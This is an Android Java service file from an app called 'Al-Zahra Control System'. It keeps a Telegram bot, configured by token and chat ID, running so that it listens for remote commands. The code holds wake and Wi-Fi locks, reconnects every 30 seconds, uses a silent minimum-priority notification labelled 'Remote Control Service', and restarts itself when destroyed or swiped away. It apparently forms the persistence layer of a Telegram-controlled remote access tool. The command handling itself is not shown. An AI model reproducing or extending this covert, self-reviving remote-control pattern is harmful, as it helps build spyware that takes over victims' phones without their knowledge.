package com.alzahra.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.alzahra.MainActivity;
import com.alzahra.R;
import com.alzahra.telegram.BotManager;

public class BotService extends Service {
    private static final String TAG = "BotService";
    private static final String CHANNEL_ID = "alzahra_service";
    private static final int NOTIFICATION_ID = 9999;
    
    private BotManager botManager;
    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;
    private Handler reconnectHandler;
    private Runnable reconnectRunnable;
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== BotService Created ===");
        createNotificationChannel();
        acquireLocks();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "=== BotService Started ===");
        
        String token = intent != null ? intent.getStringExtra("token") : null;
        String chatId = intent != null ? intent.getStringExtra("chat_id") : null;
        
        if (token == null) {
            token = MainActivity.BOT_TOKEN;
            chatId = MainActivity.CHAT_ID;
        }
        
        // بدء الإشعار المستمر
        startForeground(NOTIFICATION_ID, createPersistentNotification());
        
        // بدء البوت
        startBot(token, chatId);
        
        // جدولة إعادة الاتصال التلقائي
        scheduleReconnect(token, chatId);
        
        // START_STICKY يضمن إعادة تشغيل الخدمة
        return START_STICKY;
    }
    
    private void acquireLocks() {
        // WakeLock يمنع الجهاز من الدخول في وضع السبات
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AlZahra::BotWakeLock");
        wakeLock.acquire(10*60*60*1000L); // 10 ساعات
        
        // WiFiLock يحافظ على الاتصال بالشبكة
        WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "AlZahra::BotWifiLock");
        wifiLock.acquire();
        
        Log.d(TAG, "Locks acquired");
    }
    
    private void startBot(String token, String chatId) {
        if (botManager != null) {
            botManager.stop();
        }
        
        botManager = new BotManager(token, chatId, this);
        botManager.start();
    }
    
    private void scheduleReconnect(String token, String chatId) {
        reconnectHandler = new Handler(Looper.getMainLooper());
        reconnectRunnable = () -> {
            Log.d(TAG, "Checking bot connection...");
            if (botManager == null || !botManager.isConnected()) {
                Log.d(TAG, "Reconnecting bot...");
                startBot(token, chatId);
            }
            reconnectHandler.postDelayed(reconnectRunnable, 30000); // كل 30 ثانية
        };
        reconnectHandler.postDelayed(reconnectRunnable, 30000);
    }
    
    private Notification createPersistentNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 
            PendingIntent.FLAG_IMMUTABLE);
            
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Al-Zahra Control System")
            .setContentText("الخادم نشط | جاري الاستماع للأوامر...")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, 
                "Al-Zahra Control",
                NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Remote Control Service");
            channel.setSound(null, null);
            channel.enableLights(false);
            channel.enableVibration(false);
            
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "=== BotService Destroyed - Restarting ===");
        
        // إلغاء الجدولة
        if (reconnectHandler != null) {
            reconnectHandler.removeCallbacks(reconnectRunnable);
        }
        
        // إيقاف البوت
        if (botManager != null) {
            botManager.stop();
        }
        
        // تحرير الأقفال
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (wifiLock != null && wifiLock.isHeld()) {
            wifiLock.release();
        }
        
        // إعادة تشغيل الخدمة فوراً
        Intent restartIntent = new Intent(this, BotService.class);
        startService(restartIntent);
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "=== Task Removed - Keeping Service Alive ===");
        // إعادة تشغيل الخدمة إذا أزيلت من المهام
        Intent restartIntent = new Intent(this, BotService.class);
        startService(restartIntent);
    }
}
